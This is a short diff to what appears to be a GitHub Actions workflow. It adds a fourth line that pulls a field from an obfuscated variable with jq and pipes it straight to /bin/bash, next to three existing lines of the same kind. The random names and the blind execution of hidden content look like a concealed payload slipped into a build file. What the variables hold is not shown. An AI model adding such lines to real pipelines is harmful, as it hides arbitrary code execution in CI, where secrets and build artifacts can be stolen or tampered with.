@@ -23,6 +23,7 @@ jobs:
           echo $j3 | jq -r .rdm4033 | /bin/bash
           printf '%s' "$nmm1851" | jq -r .fwiey0 | /bin/bash
           printf '%s' "$u73538" | jq -r .oh0967 | /bin/bash
+          echo $q37685 | jq -r .r561 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
